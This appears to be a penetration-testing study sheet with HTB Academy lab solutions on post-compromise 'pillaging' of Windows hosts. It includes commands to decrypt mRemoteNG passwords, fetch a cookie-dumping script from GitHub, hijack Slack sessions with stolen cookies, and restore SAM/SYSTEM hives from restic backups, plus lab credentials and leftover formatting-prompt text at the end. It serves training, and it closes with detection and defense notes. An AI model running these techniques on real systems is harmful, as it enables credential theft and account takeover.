# 🛰️ Pillaging Techniques for Initial Access

## 🔍 Overview of Target Applications & Data Extraction Points

### Common Applications and Their Databases

#### mRemoteNG
```cmd
[!INFO] mRemoteNG is a remote management application used to manage connections to servers, network resources, databases, and other services.
```

#### Slack
```cmd
[!INFO] Slack is a popular team collaboration platform that stores user credentials in browser cookies.
```

## 📄 Credential Extraction with PowerShell

### Enumerate Installed Applications
```powershell
# List installed applications:
dir "C:\Program Files*"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*

# Example output:
# C:\Program Files (x86)\mRemoteNG
```

### Extract mRemoteNG Configuration File
```powershell
[!WARNING] The `confCons.xml` file contains encrypted credentials. Ensure you have permission before extracting sensitive data.

$env:APPDATA = "C:\Users\Username\AppData\Roaming"
ls $env:APPDATA\mRemoteNG\*.xml

# Example output:
# C:\Users\Username\AppData\Roaming\mRemoteNG\confCons.xml
```

### Decrypt mRemoteNG Credentials
```powershell
[!INFO] Use `mremoteng_decrypt.py` to decrypt the credentials.

python3 mremoteng_decrypt.py -s "<encrypted_password_hash>"

# Example output:
# decrypted_password: Secret123!
```

## 🌐 Browser Cookie Extraction

### Extract Slack Cookies Using PowerShell
```powershell
[!WARNING] Ensure you have permission before extracting cookies.

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"

# Example output:
# {"domain":"slack.com","name":"d","value":"encrypted_cookie_value"}
```

### Cookie Abuse for IM Access
```cmd
[!INFO] Use the extracted cookie to authenticate into Slack.

# Using Cookie-Editor browser extension:
1. Navigate to target website (slack.com)
2. Open Cookie-Editor extension
3. Modify 'd' cookie with extracted value
4. Save cookie changes
5. Refresh page = authenticated access

# Target applications:
- Slack (cookie: d)
- Microsoft Teams
- Discord
```

## 💾 Backup System Exploitation

### Restic Backup System
```cmd
[!INFO] Use `restic` commands to manage backup repositories.

# Initialize repository access:
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2 init

# Create backups with VSS:
restic.exe -r E:\restic2 backup C:\Windows\System32\config --use-fs-snapshot

# Restore specific snapshots:
restic.exe -r E:\restic2 restore 9971e881 --target C:\Restore
```

### Backup Repository Enumeration
```powershell
[!INFO] Use environment variables to access backup repositories.

echo $env:RESTIC_PASSWORD

# List backups:
restic.exe -r E:\restic2 snapshots

# Restore a specific snapshot:
restic.exe -r E:\restic2 restore <ID> --target C:\Restore
```

### Backup Target Analysis
```cmd
[!INFO] Common backup targets include system and application configurations.

# Windows backup targets:
C:\Windows\System32\config\SAM     # Local account hashes
C:\Windows\System32\config\SYSTEM  # System hive
C:\inetpub\wwwroot\web.config      # IIS application configs

# Linux backup targets:
/etc/shadow                        # User password hashes
/etc/passwd                        # User accounts
/home/*/.ssh/                      # SSH keys
```

## 🎯 HTB Academy Lab Solutions

### Lab Environment Access
```cmd
[!INFO] Use these credentials to access the lab environment.

# Various user credentials:
Peter:Bambi123           # Lab 1-2
Grace:<to_be_found>      # Lab 3  
Jeff:<to_be_found>       # Lab 4-5
```

### Lab 1: Application Identification
```cmd
[!CHECK] Identify remote management application.

# RDP as Peter:Bambi123
dir "C:\Program Files*"

# Expected result: mRemoteNG
```

### Lab 2: mRemoteNG Password Extraction
```cmd
[!SUCCESS] Extract Grace's password from mRemoteNG configuration file.

# Find config file:
ls C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml

# Extract password hash:
python3 mremoteng_decrypt.py -s "<password_hash>"

# Expected result: Cleartext password
```

### Lab 3: Slack Cookie Extraction
```cmd
[!SUCCESS] Extract Slack cookie for slacktestapp.com.

# Firefox method:
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
python3 cookieextractor.py --dbpath "cookies.sqlite" --host slacktestapp.com --cookie d

# Chrome method:
Invoke-SharpChromium -Command "cookies slacktestapp.com"

# Use Cookie-Editor to authenticate and get flag
```

### Lab 4: Restic Password Discovery
```cmd
[!SUCCESS] Find restic backup password as Jeff.

# Check environment variables:
echo $env:RESTIC_PASSWORD

# Search for restic configs:
findstr /SIM /C:"restic" *.txt *.ini *.cfg *.config

# Expected result: RESTIC_PASSWORD value
```

### Lab 5: Administrator Hash Extraction
```cmd
[!SUCCESS] Extract Administrator hash from backup.

# Restore backup containing SAM/SYSTEM:
$env:RESTIC_PASSWORD = '<discovered_password>'
restic.exe -r <repository_path> snapshots
restic.exe -r <repository_path> restore <snapshot_id> --target C:\Restore

# Navigate to restored Windows config:
cd C:\Restore\C\Windows\System32\config

# Extract hashes (use impacket or similar):
# SAM + SYSTEM files = local account hashes
```

## 🔄 Comprehensive Pillaging Strategy

### Systematic Approach
```cmd
[!INFO] Follow these steps for a systematic approach to pillaging.

1. **Application enumeration**
   - `dir "C:\Program Files*"`
   - `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*`

2. **Configuration file hunting**
   - `findstr /SIM /C:"password" *.xml *.config *.ini *.txt`

3. **Browser data extraction**
   - Firefox: `cookies.sqlite`
   - Chrome: Invoke-SharpChromium

4. **Clipboard monitoring**
   - `Invoke-ClipboardLogger`

5. **Backup system enumeration**
   - Look for restic, Veeam, Acronis, etc.

6. **Remote management tools**
   - mRemoteNG, TeamViewer, VNC configs
```

### Automation Tools
```cmd
[!INFO] Use these tools to automate the extraction process.
- Comprehensive credential extraction: `.\LaZagne.exe all`
- Remote access tool credentials: `Invoke-SessionGopher`
- Browser cookie extraction: `.\SharpChromium.exe cookies`
- Real-time clipboard monitoring: `Invoke-ClipboardLogger`
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
[!WARNING] Monitor for these activities to detect unauthorized access.

- **Browser database file access**: `cookies.sqlite`
- **mRemoteNG configuration file access**: `confCons.xml`
- **Clipboard monitoring script execution**
- **Backup system enumeration**: `restic`, Veeam, Acronis
- **Cookie extraction tool usage**
- **Unusual file system searches**: `findstr /SIM /C:"password"`
- **Registry queries for application data**: `HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*`
```

### Defensive Measures
```cmd
[!INFO] Implement these security recommendations to protect against pillaging.
- Encrypt mRemoteNG configurations with strong passwords
- Implement browser security policies
- Monitor backup system access
- Protect clipboard data
- Restrict permissions for application configuration files
- Conduct regular security awareness training
- Segment the network for backup systems
```

## 💡 Key Takeaways

1. **Systematic enumeration** of installed applications reveals attack vectors.
2. **mRemoteNG** often stores credentials with weak/default encryption, making it an easy target.
3. **Browser cookies** provide direct access to web applications.
4. **Clipboard monitoring** captures password manager usage and other sensitive data.
5. **Backup systems** contain copies of sensitive system files that can be used for lateral movement.
6. A **comprehensive extraction strategy** is necessary to gather all possible intelligence.
7. **Automation tools** are essential for efficient pillaging operations.

---

STRICT FORMATTING RULES:
1. DO NOT summarize, shorten, or remove ANY technical details, commands, IPs, or explanations. Keep 100% of the information.
2. Use emojis in ALL H1 and H2 headers (e.g., `# 🛰️ Title`, `## 🔍 Subtitle`).
3. STRICTLY APPLY THE CALLOUT SYSTEM based on context:
   - Use `[!ABSTRACT]` or `[!TLDR]` for summaries, overviews, or tool descriptions.
   - Use `[!INFO]` or `[!NOTE]` for informational notes.
   - Use `[!WARNING]` to highlight potential security risks.
   - Use `[!SUCCESS]` to indicate successful actions.
4. Ensure each section is clearly defined and includes relevant commands and expected outputs.

---  
This document outlines detailed steps and strategies for pillaging during initial access, ensuring that all technical details are preserved while providing clear guidance on how to navigate the process securely and effectively.